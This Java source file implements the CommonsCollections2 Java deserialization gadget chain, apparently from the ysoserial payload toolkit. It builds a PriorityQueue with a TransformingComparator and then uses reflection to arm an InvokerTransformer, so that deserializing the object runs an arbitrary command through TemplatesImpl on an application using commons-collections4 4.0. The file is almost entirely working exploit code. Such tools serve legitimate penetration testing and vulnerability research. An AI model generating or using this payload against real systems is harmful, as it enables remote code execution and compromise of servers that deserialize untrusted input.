package payloads.gadgets;

import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import payloads.annotation.Authors;
import payloads.annotation.Dependencies;
import payloads.utils.Gadgets;
import payloads.utils.Reflections;

import java.util.PriorityQueue;
import java.util.Queue;


/*
	Gadget chain:
		ObjectInputStream.readObject()
			PriorityQueue.readObject()
				...
					TransformingComparator.compare()
						InvokerTransformer.transform()
							Method.invoke()
								Runtime.exec()
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Authors({Authors.FROHOFF})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
public class CommonsCollections2 implements ObjectGadget {


    public Queue<Object> getObject(String cmd) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(cmd);
        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

}
